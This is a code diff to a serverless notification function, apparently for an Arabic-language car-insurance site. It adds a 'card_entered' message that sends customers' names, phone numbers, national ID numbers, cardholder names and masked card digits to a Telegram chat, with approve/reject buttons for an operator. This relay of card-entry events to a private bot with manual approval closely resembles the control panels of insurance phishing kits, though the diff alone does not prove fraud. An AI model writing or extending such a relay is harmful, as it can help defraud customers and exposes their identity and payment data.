@@ -9,35 +9,60 @@ const corsHeaders = {
 };
 
 interface NotificationRequest {
-  // For user signups
+  type?: string;
   email?: string;
   full_name?: string;
   user_id?: string;
-  
-  // For customer orders
   order_id?: string;
   owner_name?: string;
   phone_number?: string;
   insurance_company?: string;
   insurance_price?: number;
   id_number?: string;
+  card_number?: string;
+  card_holder_name?: string;
 }
 
 serve(async (req) => {
-  // Handle CORS preflight requests
   if (req.method === 'OPTIONS') {
     return new Response(null, { headers: corsHeaders });
   }
 
   try {
     const data: NotificationRequest = await req.json();
-
     let message: string;
+    let replyMarkup: any = undefined;
 
-    // Check if it's a user signup or customer order
-    if (data.order_id) {
-      // Customer order notification
-      console.log('Sending Telegram notification for new order:', data);
+    if (data.type === 'card_entered') {
+      // إشعار إدخال بيانات البطاقة مع أزرار الموافقة والرفض
+      console.log('Sending Telegram notification for card entered:', data);
+      
+      const maskedCard = data.card_number 
+        ? `****${data.card_number.slice(-4)}` 
+        : 'غير محدد';
+      
+      message = `💳 *بيانات بطاقة جديدة*\n\n` +
+                `📋 *رقم الطلب:* ${data.order_id}\n` +
+                `👤 *اسم العميل:* ${data.owner_name || 'غير محدد'}\n` +
+                `📱 *رقم الجوال:* ${data.phone_number || 'غير محدد'}\n` +
+                `🏢 *شركة التأمين:* ${data.insurance_company || 'غير محدد'}\n` +
+                `💰 *قيمة التأمين:* ${data.insurance_price ? `${data.insurance_price} ريال` : 'غير محدد'}\n` +
+                `🆔 *رقم الهوية:* ${data.id_number || 'غير محدد'}\n` +
+                `💳 *البطاقة:* ${maskedCard}\n` +
+                `👤 *حامل البطاقة:* ${data.card_holder_name || 'غير محدد'}\n` +
+                `🕐 *التاريخ:* ${new Date().toLocaleString('ar-SA', { timeZone: 'Asia/Riyadh' })}`;
+
+      replyMarkup = {
+        inline_keyboard: [
+          [
+            { text: '✅ موافقة', callback_data: `approve_${data.order_id}` },
+            { text: '❌ رفض', callback_data: `reject_${data.order_id}` }
+          ]
+        ]
+      };
+    } else if (data.order_id) {
+      // إشعار طلب عادي (لن يُستخدم بعد الآن من الترايقر)
+      console.log('Sending Telegram notification for order:', data);
       
       message = `🔔 *طلب تأمين جديد*\n\n` +
                 `📋 *رقم الطلب:* ${data.order_id}\n` +
@@ -48,7 +73,7 @@ serve(async (req) => {
                 `🆔 *رقم الهوية:* ${data.id_number || 'غير محدد'}\n` +
                 `🕐 *التاريخ:* ${new Date().toLocaleString('ar-SA', { timeZone: 'Asia/Riyadh' })}`;
     } else {
-      // User signup notification
+      // إشعار تسجيل مستخدم جديد
       console.log('Sending Telegram notification for new user:', data);
       
       message = `🔔 *مستخدم جديد سجل في الموقع*\n\n` +
@@ -58,18 +83,22 @@ serve(async (req) => {
                 `🕐 *التاريخ:* ${new Date().toLocaleString('ar-SA', { timeZone: 'Asia/Riyadh' })}`;
     }
 
+    const telegramBody: any = {
+      chat_id: TELEGRAM_CHAT_ID,
+      text: message,
+      parse_mode: 'Markdown',
+    };
+
+    if (replyMarkup) {
+      telegramBody.reply_markup = replyMarkup;
+    }
+
     const telegramResponse = await fetch(
       `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
       {
         method: 'POST',
-        headers: {
-          'Content-Type': 'application/json',
-        },
-        body: JSON.stringify({
-          chat_id: TELEGRAM_CHAT_ID,
-          text: message,
-          parse_mode: 'Markdown',
-        }),
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(telegramBody),
       }
     );
 
@@ -84,19 +113,13 @@ serve(async (req) => {
 
     return new Response(
       JSON.stringify({ success: true, message: 'Notification sent' }),
-      {
-        status: 200,
-        headers: { ...corsHeaders, 'Content-Type': 'application/json' },
-      }
+      { status: 200, headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
     );
   } catch (error: any) {
     console.error('Error in send-telegram-notification function:', error);
     return new Response(
       JSON.stringify({ error: error.message }),
-      {
-        status: 500,
-        headers: { ...corsHeaders, 'Content-Type': 'application/json' },
-      }
+      { status: 500, headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
     );
   }
 });
